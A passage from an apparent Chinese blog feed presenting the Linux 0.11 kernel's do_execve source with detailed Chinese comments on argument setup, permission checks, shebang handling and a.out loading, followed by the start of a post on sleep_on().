i,argc,envc;</span><br><span class="line"><span class="keyword">int</span> e_uid, e_gid;</span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"><span class="keyword">int</span> sh_bang = <span class="number">0</span>;                            <span class="comment">// 控制是否需要执行的脚本程序</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> p=PAGE_SIZE*MAX_ARG_PAGES<span class="number">-4</span>;  <span class="comment">// p指向参数和环境空间的最后部</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在正式设置执行文件的运行环境之前，让我们先干这些杂事。内核准备了128kb(32</span></span><br><span class="line">    <span class="comment">// 个页面)空间来存放化执行文件的命令行参数和环境字符串。上杭把p初始设置成位</span></span><br><span class="line">    <span class="comment">// 于128KB空间中的当前位置。</span></span><br><span class="line">    <span class="comment">// 另外，参数eip[1]是调用本次系统调用的原用户程序代码段寄存器CS值，其中的段</span></span><br><span class="line">    <span class="comment">// 选择符当然必须是当前任务的代码段选择符0x000f.若不是该值，那么CS只能会是</span></span><br><span class="line">    <span class="comment">// 内核代码段的选择符0x0008.但这是绝对不允许的，因为内核代码是常驻内存而不</span></span><br><span class="line">    <span class="comment">// 能被替换掉的。因此下面根据eip[1]的值确认是否符合正常情况。然后再初始化</span></span><br><span class="line">    <span class="comment">// 128KB的参数和环境串空间，把所有字节清零，并取出执行文件的i节点。再根据函</span></span><br><span class="line">    <span class="comment">// 数参数分别计算出命令行参数和环境字符串的个数argc和envc。另外，执行文件必</span></span><br><span class="line">    <span class="comment">// 须是常规文件。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0xffff</span> &amp; eip[<span class="number">1</span>]) != <span class="number">0x000f</span>)</span><br><span class="line">panic(<span class="string">&quot;execve called from supervisor mode&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;MAX_ARG_PAGES ; i++)<span class="comment">/* clear page-table */</span></span><br><span class="line">page[i]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(inode=namei(filename)))<span class="comment">/* get executables inode */</span></span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line">argc = count(argv);</span><br><span class="line">envc = count(envp);</span><br><span class="line"></span><br><span class="line">restart_interp:</span><br><span class="line"><span class="keyword">if</span> (!S_ISREG(inode-&gt;i_mode)) &#123;<span class="comment">/* must be regular file */</span></span><br><span class="line">retval = -EACCES;</span><br><span class="line"><span class="keyword">goto</span> exec_error2;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 下面检查当前进程是否有权运行指定的执行文件。即根据执行文件i节点中的属性，</span></span><br><span class="line">    <span class="comment">// 看看本进程是否有权执行它。在把执行文件i节点的属性字段值取到i中后，我们首</span></span><br><span class="line">    <span class="comment">// 先查看属性中是否设置了&quot;设置-用户-ID&quot;(set-user_id)标志和“设置-组-ID”(set_group-id)</span></span><br><span class="line">    <span class="comment">// 标志。这两个标志主要是让一般用户能够执行特权用户(如超级用户root)的程序，</span></span><br><span class="line">    <span class="comment">// 例如改变密码的程序passwd等。如果set-user-id标志置位，则后面执行进程的有</span></span><br><span class="line">    <span class="comment">// 效用户ID(euid)就设置成执行文件的用户ID，否则设置成当前进程的euid。如果执</span></span><br><span class="line">    <span class="comment">// 行文件set-group-id被置位的话，则执行进程的有效组ID（egid）就被设置为执行</span></span><br><span class="line">    <span class="comment">// 文件的组ID。否则设置成当前进程的egid。这里暂时把这两个判断出来的值保存在</span></span><br><span class="line">    <span class="comment">// 变量e_uid和e_gid中。</span></span><br><span class="line">i = inode-&gt;i_mode;                      <span class="comment">// 取文件属性字段</span></span><br><span class="line">e_uid = (i &amp; S_ISUID) ? inode-&gt;i_uid : current-&gt;euid;</span><br><span class="line">e_gid = (i &amp; S_ISGID) ? inode-&gt;i_gid : current-&gt;egid;</span><br><span class="line">    <span class="comment">// 现在根据进程的euid和egid和执行文件的访问属性进行比较。如果执行文件属于运</span></span><br><span class="line">    <span class="comment">// 行进程的用户，则把文件属性值i右移6位，此时最低3位是文件宿主的访问权限标</span></span><br><span class="line">    <span class="comment">// 志。否则的话如果执行文件与当前进程的用户属性同租，则使属性值最低3位是执</span></span><br><span class="line">    <span class="comment">// 行文件组用户的访问权限标志。否则此时属性值最低3位就是其他用户访问该执行</span></span><br><span class="line">    <span class="comment">// 文件的权限。</span></span><br><span class="line">    <span class="comment">// 然后我们根据属性字i的最低3bit值来判断当前进程是否有权限运行这个执行文件。</span></span><br><span class="line">    <span class="comment">// 如果选出的相应用户没有运行该文件的权利(位0是执行权限)，并且其他用户也没</span></span><br><span class="line">    <span class="comment">// 有任何权限或者当前进程用户不是超级用户，则表明当前进程没有权利运行这个执</span></span><br><span class="line">    <span class="comment">// 行文件。于是置不可执行出错码，并跳转到exec_error2处去做退出处理。</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;euid == inode-&gt;i_uid)</span><br><span class="line">i &gt;&gt;= <span class="number">6</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (current-&gt;egid == inode-&gt;i_gid)</span><br><span class="line">i &gt;&gt;= <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (!(i &amp; <span class="number">1</span>) &amp;&amp;</span><br><span class="line">    !((inode-&gt;i_mode &amp; <span class="number">0111</span>) &amp;&amp; suser())) &#123;</span><br><span class="line">retval = -ENOEXEC;</span><br><span class="line"><span class="keyword">goto</span> exec_error2;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 程序执行到这里，说明当前进程有运行指定执行文件的权限。因此从这里开始我们</span></span><br><span class="line">    <span class="comment">// 需要取出执行文件头部数据并根据其中的信息来分析设置运行环境，或者运行另一</span></span><br><span class="line">    <span class="comment">// 个shell程序来执行脚本程序。首先读取执行文件第1块数据到高速缓冲块中。并复</span></span><br><span class="line">    <span class="comment">// 制缓冲块数据到ex中。如果执行文件开始的两个字节是字符&#x27;#!&#x27;，则说明执行文件</span></span><br><span class="line">    <span class="comment">// 是一个脚本文件。如果想运行脚本文件，我们就需要执行脚本文件的解释程序(例</span></span><br><span class="line">    <span class="comment">// 如shell程序)。通常脚本文件的第一行文本为&#x27;#!/bin/bash&#x27;。他指明了运行脚本</span></span><br><span class="line">    <span class="comment">// 文件需要的解释程序。运行方法从脚本文件第一行中取出其中的解释程序名及后面</span></span><br><span class="line">    <span class="comment">// 的参数(若有的话)，然后将这些参数和脚本文件名放进执行文件（此时是解释程序）</span></span><br><span class="line">    <span class="comment">// 的命令行参数空间中。在这之前我们当然需要先把函数指定的原有命令行参数和环</span></span><br><span class="line">    <span class="comment">// 境字符串放到128KB空间中，而这里建立起来的命令行参数则放到它们前面位置处(</span></span><br><span class="line">    <span class="comment">// 因为是逆向放置)。最后让内核执行脚本文件的解释程序。下面就是在设置好解释</span></span><br><span class="line">    <span class="comment">// 程序的脚本文件名等参数后，取出解释程序的i节点并跳转去执行解释程序。由于</span></span><br><span class="line">    <span class="comment">// 我们需要跳转去执行，因此在下面确认处并处理了脚本文件之后需要设置一个禁止</span></span><br><span class="line">    <span class="comment">// 再次执行下面的脚本处理代码标志sh_bang。在后面的代码中该标志也用来表示我</span></span><br><span class="line">    <span class="comment">// 们已经设置好执行的命令行参数，不用重复设置。</span></span><br><span class="line"><span class="keyword">if</span> (!(bh = bread(inode-&gt;i_dev,inode-&gt;i_zone[<span class="number">0</span>]))) &#123;</span><br><span class="line">retval = -EACCES;</span><br><span class="line"><span class="keyword">goto</span> exec_error2;</span><br><span class="line">&#125;</span><br><span class="line">ex = *((struct exec *) bh-&gt;b_data);<span class="comment">/* read exec-header */</span></span><br><span class="line"><span class="keyword">if</span> ((bh-&gt;b_data[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>) &amp;&amp; (bh-&gt;b_data[<span class="number">1</span>] == <span class="string">&#x27;!&#x27;</span>) &amp;&amp; (!sh_bang)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This section does the #! interpretation.</span></span><br><span class="line"><span class="comment"> * Sorta complicated, but hopefully it will work.  -TYT</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1023</span>], *cp, *interp, *i_name, *i_arg;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> old_fs;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从这里开始，我们从脚本文件中提取解释程序名以及其参数，并把解释程序名、</span></span><br><span class="line">        <span class="comment">// 解释程序的参数和脚本文件名组合放入环境参数块中。首先复制脚本文件头1</span></span><br><span class="line">        <span class="comment">// 行字符&#x27;#!&#x27;后面的字符串到buf中，其中含有脚本解释程序名，也可能包含解</span></span><br><span class="line">        <span class="comment">// 释程序的几个参数。然后对buf中的内容进行处理。删除开始空格、制表符。</span></span><br><span class="line"><span class="built_in">strncpy</span>(buf, bh-&gt;b_data+<span class="number">2</span>, <span class="number">1022</span>);</span><br><span class="line">brelse(bh);</span><br><span class="line">iput(inode);</span><br><span class="line">buf[<span class="number">1022</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ((cp = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\n&#x27;</span>))) &#123;</span><br><span class="line">*cp = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (cp = buf; (*cp == <span class="string">&#x27; &#x27;</span>) || (*cp == <span class="string">&#x27;\t&#x27;</span>); cp++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!cp || *cp == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">retval = -ENOEXEC; <span class="comment">/* No interpreter name found */</span></span><br><span class="line"><span class="keyword">goto</span> exec_error1;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 此时我们得到了开头是脚本解释程序名的一行内容(字符串)。下面分析改行。</span></span><br><span class="line">        <span class="comment">// 首先取第一个字符串，它应该是解释程序名，此时i_name指向该名称。若解释</span></span><br><span class="line">        <span class="comment">// 程序名后还有字符，则它们应该是解释程序的参数串，于是令i_arg指向该串。</span></span><br><span class="line">interp = i_name = cp;</span><br><span class="line">i_arg = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( ; *cp &amp;&amp; (*cp != <span class="string">&#x27; &#x27;</span>) &amp;&amp; (*cp != <span class="string">&#x27;\t&#x27;</span>); cp++) &#123;</span><br><span class="line"> <span class="keyword">if</span> (*cp == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">i_name = cp+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (*cp) &#123;</span><br><span class="line">*cp++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">i_arg = cp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * OK, we&#x27;ve parsed out the interpreter name and</span></span><br><span class="line"><span class="comment"> * (optional) argument.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// 现在我们要把上面解析出来的解释程序名i_name及其参数i_arg和脚本文件名作</span></span><br><span class="line">        <span class="comment">// 即使程序的参数放进环境和参数块中。不过首先我们需要把函数提供的原来一</span></span><br><span class="line">        <span class="comment">// 些参数和环境字符串先放进去，然后再放这里解析出来的。例如对于命令行参</span></span><br><span class="line">        <span class="comment">// 数来说，如果原来的参数是&quot;-arg1-arg2&quot;、解释程序名是bash、其参数是&quot;-iarg1</span></span><br><span class="line">        <span class="comment">//  -iarg2&quot;、脚本文件名(即原来的执行文件名)是&quot;example.sh&quot;，那么放入这里</span></span><br><span class="line">        <span class="comment">//  的参数之后，新的命令行类似于这样：</span></span><br><span class="line">        <span class="comment">//  &quot;bash -iarg1 -iarg2 example.sh -arg1 -arg2&quot;</span></span><br><span class="line">        <span class="comment">//  这里我们把sh_bang标志置上，然后把函数参数提供的原有参数和环境字符串</span></span><br><span class="line">        <span class="comment">//  放入到空间中。环境字符串和参数个数分别是envc和argc-1个。少复制的一</span></span><br><span class="line">        <span class="comment">//  个原有参数是原来的执行文件名，即这里的脚本文件名。[[??? 这里可以看</span></span><br><span class="line">        <span class="comment">//  出，实际上我们需要去另行处理脚本文件名，即这里完全可以复制argc个参</span></span><br><span class="line">        <span class="comment">//  数，包括原来执行文件名(即现在的脚本文件名)。因为它位于同一个位置上]]</span></span><br><span class="line">        <span class="comment">//  注意！这里指针p随着复制信息增加而逐渐向小地址方向移动，因此这两个复</span></span><br><span class="line">        <span class="comment">//  制串函数执行完后，环境参数串信息块位于程序命令行参数串信息块的上方，</span></span><br><span class="line">        <span class="comment">//  并且p指向程序的第一个参数串。copy_strings()最后一个参数(0)指明参数</span></span><br><span class="line">        <span class="comment">//  字符串在用户空间。</span></span><br><span class="line"><span class="keyword">if</span> (sh_bang++ == <span class="number">0</span>) &#123;</span><br><span class="line">p = copy_strings(envc, envp, page, p, <span class="number">0</span>);</span><br><span class="line">p = copy_strings(--argc, argv+<span class="number">1</span>, page, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Splice in (1) the interpreter&#x27;s name for argv[0]</span></span><br><span class="line"><span class="comment"> *           (2) (optional) argument to interpreter</span></span><br><span class="line"><span class="comment"> *           (3) filename of shell script</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is done in reverse order, because of how the</span></span><br><span class="line"><span class="comment"> * user environment and arguments are stored.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// 接着我们逆向复制脚本文件名、解释程序的参数和解释程序文件名到参数和环</span></span><br><span class="line">        <span class="comment">// 境空间中。若出错，则置出错码，跳转到exec_error1。另外，由于本函数参</span></span><br><span class="line">        <span class="comment">// 数提供的脚本文件名filename在用户空间，而这里赋予copy_string()的脚本</span></span><br><span class="line">        <span class="comment">// 文件名指针在内核空间，因此这个复制字符串函数的最后一个参数(字符串来</span></span><br><span class="line">        <span class="comment">// 源标志)需要被设置成1.若字符串在内核空间，则copy_strings()的最后一个</span></span><br><span class="line">        <span class="comment">// 参数要设置成2。</span></span><br><span class="line">p = copy_strings(<span class="number">1</span>, &amp;filename, page, p, <span class="number">1</span>);</span><br><span class="line">argc++;</span><br><span class="line"><span class="keyword">if</span> (i_arg) &#123;</span><br><span class="line">p = copy_strings(<span class="number">1</span>, &amp;i_arg, page, p, <span class="number">2</span>);</span><br><span class="line">argc++;</span><br><span class="line">&#125;</span><br><span class="line">p = copy_strings(<span class="number">1</span>, &amp;i_name, page, p, <span class="number">2</span>);</span><br><span class="line">argc++;</span><br><span class="line"><span class="keyword">if</span> (!p) &#123;</span><br><span class="line">retval = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> exec_error1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * OK, now restart the process with the interpreter&#x27;s inode.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// 最后我们取得解释程序的i节点指针，然后跳转到上面去执行解释程序。为了</span></span><br><span class="line">        <span class="comment">// 获得解释程序的i节点，我们需要使用namei()函数，但是该函数所使用的参数</span></span><br><span class="line">        <span class="comment">// (文件名)是从用户数据空间得到的，即从段寄存器fs指向空间中取得。因此调</span></span><br><span class="line">        <span class="comment">// 用namei()函数之前我们需要先临时让fs指向内核数据空间，以让函数能从内</span></span><br><span class="line">        <span class="comment">// 核空间得到解释程序名，并在namei()返回后恢复fs的默认设置。因此这里我</span></span><br><span class="line">        <span class="comment">// 们先临时保存原fs段寄存器（原指向用户数据段）的值，将其设置成指向内核</span></span><br><span class="line">        <span class="comment">// 数据段，然后取解释程序的i节点。之后再恢复fs的原值。并跳转到restart_interp</span></span><br><span class="line">        <span class="comment">// 出重新处理新的执行文件——脚本文件解释程序。</span></span><br><span class="line">old_fs = get_fs();</span><br><span class="line">set_fs(get_ds());</span><br><span class="line"><span class="keyword">if</span> (!(inode=namei(interp))) &#123; <span class="comment">/* get executables inode */</span></span><br><span class="line">set_fs(old_fs);</span><br><span class="line">retval = -ENOENT;</span><br><span class="line"><span class="keyword">goto</span> exec_error1;</span><br><span class="line">&#125;</span><br><span class="line">set_fs(old_fs);</span><br><span class="line"><span class="keyword">goto</span> restart_interp;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 此时缓冲块中的执行文件头结构数据已经复制到了ex中。于是先释放该缓冲块，并</span></span><br><span class="line">    <span class="comment">// 开始对ex中的执行头信息进行判断处理。对于Linux0.11内核来说，它仅支持ZMAGIC</span></span><br><span class="line">    <span class="comment">// 执行文件格式，并且执行文件代码都从逻辑地址0开始执行，因此不支持含有代码</span></span><br><span class="line">    <span class="comment">// 或数据重定位信息的执行文件。当然，如果执行文件实在太大或者执行文件残缺不</span></span><br><span class="line">    <span class="comment">// 全，那么我们也不能运行它。因此对于下列情况将不执行程序：如果执行文件不是</span></span><br><span class="line">    <span class="comment">// 需求页可执行文件（ZMAGIC）、或者代码和数据重定位部分不等于0，或者（代码段</span></span><br><span class="line">    <span class="comment">// + 数据段+堆）长度超过50MB、或者执行文件长度小于（代码段+数据段+符号表长度</span></span><br><span class="line">    <span class="comment">// +执行头部分）长度的总和。</span></span><br><span class="line">brelse(bh);</span><br><span class="line"><span class="keyword">if</span> (N_MAGIC(ex) != ZMAGIC || ex.a_trsize || ex.a_drsize ||</span><br><span class="line">ex.a_text+ex.a_data+ex.a_bss&gt;<span class="number">0x3000000</span> ||</span><br><span class="line">inode-&gt;i_size &lt; ex.a_text+ex.a_data+ex.a_syms+N_TXTOFF(ex)) &#123;</span><br><span class="line">retval = -ENOEXEC;</span><br><span class="line"><span class="keyword">goto</span> exec_error2;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 另外，如果执行文件中代码开始处没有位于1个页面(1024字节)边界处，则也不能</span></span><br><span class="line">    <span class="comment">// 执行。因为需求页(Demand paging)技术要求加载执行文件内容时以页面为单位，</span></span><br><span class="line">    <span class="comment">// 因此要求执行文件映象中代码和数据都从页面边界处开始。</span></span><br><span class="line"><span class="keyword">if</span> (N_TXTOFF(ex) != BLOCK_SIZE) &#123;</span><br><span class="line">printk(<span class="string">&quot;%s: N_TXTOFF != BLOCK_SIZE. See a.out.h.&quot;</span>, filename);</span><br><span class="line">retval = -ENOEXEC;</span><br><span class="line"><span class="keyword">goto</span> exec_error2;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 如果sh_bang标志没有设置，则复制指定个数的命令行参数和环境字符串到参数和</span></span><br><span class="line">    <span class="comment">// 环境空间中。若sh_bang标志已经设置，则表明是将运行脚本解释程序，此时环境</span></span><br><span class="line">    <span class="comment">// 变量页面已经复制，无须再复制。同样，若sh_bang没有置位而需要复制的话，那</span></span><br><span class="line">    <span class="comment">// 么此时指针p随着复制信息增加而逐渐向小地址方向移动，因此这两个复制串函数</span></span><br><span class="line">    <span class="comment">// 执行完后，环境参数串信息块位于程序参数串信息块上方，并且p指向程序的第1个</span></span><br><span class="line">    <span class="comment">// 参数串。事实上，p是128KB参数和环境空间中的偏移值。因此如果p=0，则表示环</span></span><br><span class="line">    <span class="comment">// 境变量与参数空间页面已经被占满，容纳不下了。</span></span><br><span class="line"><span class="keyword">if</span> (!sh_bang) &#123;</span><br><span class="line">p = copy_strings(envc,envp,page,p,<span class="number">0</span>);</span><br><span class="line">p = copy_strings(argc,argv,page,p,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!p) &#123;</span><br><span class="line">retval = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> exec_error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* OK, This is the point of no return */</span></span><br><span class="line">    <span class="comment">// 前面我们针对函数参数提供的信息对需要运行执行文件的命令行参数和环境空间进</span></span><br><span class="line">    <span class="comment">// 行了设置，但还没有为执行文件做过什么实质性的工作，即还没有做过为执行文件</span></span><br><span class="line">    <span class="comment">// 初始化进程任务结构信息、建立页表等工作。现在我们就来做这些工作。由于执行</span></span><br><span class="line">    <span class="comment">// 文件直接使用当前进程的“躯壳”，即当钱进程将被改造成执行文件的进程，因此我</span></span><br><span class="line">    <span class="comment">// 们需要首先释放当前进程占用的某些系统资源，包括关闭指定的已打开文件、占用</span></span><br><span class="line">    <span class="comment">// 的页表和内存页面等。然后根据执行文件头结构信息修改当前进程使用的局部描述</span></span><br><span class="line">    <span class="comment">// 符表LDT中描述符的内容，重新设置代码段和数据段描述符的限长，再利用前面处</span></span><br><span class="line">    <span class="comment">// 理得到的e_uid和e_gid等信息来设置进程任务结构中相关的字段。最后把执行本次</span></span><br><span class="line">    <span class="comment">// 系统调用程序的返回地址eip[]指向执行文件中代码的其实位置处。这样当本系统</span></span><br><span class="line">    <span class="comment">// 调用退出返回后就会去运行新执行文件的代码了。注意，虽然此时新执行文件代码</span></span><br><span class="line">    <span class="comment">// 和数据还没有从文件中加载到内存中，但其参数和环境块已经在copy_strings()中</span></span><br><span class="line">    <span class="comment">// 使用get_free_page()分配了物理内存页来保存数据，并在change_ldt()函数中使</span></span><br><span class="line">    <span class="comment">// 用put_page()放到了进程逻辑空间的末端处。另外，在create_tables()中也会由</span></span><br><span class="line">    <span class="comment">// 于在用户栈上存放参数和环境指针表而引起缺页异常，从而内存管理程序也会就此</span></span><br><span class="line">    <span class="comment">// 为用户栈空间映射物理内存页。</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 这里我们首先放回进程原执行程序的i节点，并且让进程executable字段指向新执行</span></span><br><span class="line">    <span class="comment">// 文件的i节点。然后复位原进程的所有信号处理句柄。再根据设定的执行时关闭文件</span></span><br><span class="line">    <span class="comment">// 句柄（close_on_exec）位图标志，关闭指定的打开文件，并复位该标志。</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;executable)</span><br><span class="line">iput(current-&gt;executable);</span><br><span class="line">current-&gt;executable = inode;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;<span class="number">32</span> ; i++)</span><br><span class="line">current-&gt;sigaction[i].sa_handler = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_OPEN ; i++)</span><br><span class="line"><span class="keyword">if</span> ((current-&gt;close_on_exec&gt;&gt;i)&amp;<span class="number">1</span>)</span><br><span class="line">sys_close(i);</span><br><span class="line">current-&gt;close_on_exec = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 然后根据当前进程指定的基地址和限长，释放原来程序的代码段和数据段所对应的</span></span><br><span class="line">    <span class="comment">// 内存页表指定的物理内存页面及页表本身。此时新执行文件并没有占用主内存区任</span></span><br><span class="line">    <span class="comment">// 何页面，因此在处理器真正运行新执行文件代码时就会引起缺页异常中断，此时内</span></span><br><span class="line">    <span class="comment">// 存管理程序执行缺页处理而为新执行文件申请内存页面和设置相关表项，并且把相</span></span><br><span class="line">    <span class="comment">// 关执行文件页面读入内存中。如果“上次任务使用了协处理器”指向的是当前进程，</span></span><br><span class="line">    <span class="comment">// 则将其置空，并复位使用了协处理器的标志。</span></span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">1</span>]),get_limit(<span class="number">0x0f</span>));</span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">2</span>]),get_limit(<span class="number">0x17</span>));</span><br><span class="line"><span class="keyword">if</span> (last_task_used_math == current)</span><br><span class="line">last_task_used_math = <span class="literal">NULL</span>;</span><br><span class="line">current-&gt;used_math = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 然后我们根据新执行文件头结构中的代码长度字段a_text的值修改局部表中描述符</span></span><br><span class="line">    <span class="comment">// 基地址和段限长，并将128KB的参数和环境空间页面放置在数据段末端。执行下面</span></span><br><span class="line">    <span class="comment">// 语句之后，p此时更改成以数据段起始处为原点的偏移值，但仍指向参数和环境空</span></span><br><span class="line">    <span class="comment">// 间数据开始处，即已转换成为栈指针值。然后调用内部函数create_tables()在栈中</span></span><br><span class="line">    <span class="comment">// 穿件环境和参数变量指针表，供程序的main()作为参数使用，并返回该栈指针。</span></span><br><span class="line">p += change_ldt(ex.a_text,page)-MAX_ARG_PAGES*PAGE_SIZE;</span><br><span class="line">p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) create_tables((<span class="keyword">char</span> *)p,argc,envc);</span><br><span class="line">    <span class="comment">// 接着再修改各字段值为新执行文件的信息。即令进程任务结构代码尾字段end_code</span></span><br><span class="line">    <span class="comment">// 等于执行文件的代码长度a_text；数据尾字段end_data等于执行文件的代码段长度</span></span><br><span class="line">    <span class="comment">// 加数据段长度(a_data+a_text)；并令进程堆结尾字段brk=a_text+a_data+a_bss.</span></span><br><span class="line">    <span class="comment">// brk用于指明进程当前数据段（包括未初始化数据部分）末端位置。然后设置进程</span></span><br><span class="line">    <span class="comment">// 栈开始字段为栈指针所在页面，并重新设置进程的有效用户id和有效组id。</span></span><br><span class="line">current-&gt;brk = ex.a_bss +</span><br><span class="line">(current-&gt;end_data = ex.a_data +</span><br><span class="line">(current-&gt;end_code = ex.a_text));</span><br><span class="line">current-&gt;start_stack = p &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">current-&gt;euid = e_uid;</span><br><span class="line">current-&gt;egid = e_gid;</span><br><span class="line">    <span class="comment">// 如果执行文件代码加数据长度的末端不再页面边界上，则把最后不到1页长度的内</span></span><br><span class="line">    <span class="comment">// 存过空间初始化为零。</span></span><br><span class="line">i = ex.a_text+ex.a_data;</span><br><span class="line"><span class="keyword">while</span> (i&amp;<span class="number">0xfff</span>)</span><br><span class="line">put_fs_byte(<span class="number">0</span>,(<span class="keyword">char</span> *) (i++));</span><br><span class="line">    <span class="comment">// 最后将原调用系统中断的程序在堆栈上的代码指针替换为指向新执行程序的入口点，</span></span><br><span class="line">    <span class="comment">// 并将栈指针替换为执行文件的栈指针。此后返回指令将这些栈数据并使得CPU去执</span></span><br><span class="line">    <span class="comment">// 行新执行文件，因此不会返回到原调用系统中断的程序中去了。</span></span><br><span class="line">eip[<span class="number">0</span>] = ex.a_entry;<span class="comment">/* eip, magic happens :-) */</span></span><br><span class="line">eip[<span class="number">3</span>] = p;<span class="comment">/* stack pointer */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">exec_error2:</span><br><span class="line">iput(inode);</span><br><span class="line">exec_error1:</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;MAX_ARG_PAGES ; i++)</span><br><span class="line">free_page(page[i]);</span><br><span class="line"><span class="keyword">return</span>(retval);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>相对于Windows的PE格式来说该版本的可执行文件格式(a.out)还是简单许多，所以需要配套的编译链接工具提供支持，有时间可以继续分析ELF。可以同步参考<a href="https://tinylab.gitbooks.io/cbook/content/zh/preface/01-chapter1.html">这里</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;着重分析操作系统的加载器是如何运行程序的。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux kernel" scheme="https://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="LDD" scheme="https://embpgp.github.io/tags/LDD/"/>
    
      <category term="Asm" scheme="https://embpgp.github.io/tags/Asm/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核0.11完全注释 关于任务睡眠和唤醒的理解</title>
    <link href="https://embpgp.github.io/2016/12/23/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E5%85%B3%E4%BA%8E%E4%BB%BB%E5%8A%A1%E7%9D%A1%E7%9C%A0%E5%92%8C%E5%94%A4%E9%86%92%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://embpgp.github.io/2016/12/23/Linux内核0-11完全注释-关于任务睡眠和唤醒的理解/</id>
    <published>2016-12-23T06:07:48.000Z</published>
    <updated>2025-03-11T12:14:38.963Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>主要理解注释中提到的链表以及缺少几行代码的缘由</p></blockquote><span id="more"></span><hr><h1 id="何为任务调度"><a href="#何为任务调度" class="headerlink" title="何为任务调度?"></a>何为任务调度?</h1><p>学过操作系统的筒子们应该有很深刻的理论了，其实说白了就是从现有可运行的任务中选一个最紧急(或者优先级最高)的任务运行，关于如何定义”最紧急”(优先级最高或者说实时进程)才是调度算法去解决的问题，这里先不分析，Linux 0.11内核调度算法也不是很难。</p><h1 id="sleep-on-函数"><a href="#sleep-on-函数" class="headerlink" title="sleep_on()函数"></a>sleep_on()函数</h1><p>没有源代码的可以参阅<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/kernel/sched.c#L151">这里</a>。这里的代码已经有修复了。Linus原来的代码如下:(中文注释乃赵博士所写~)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 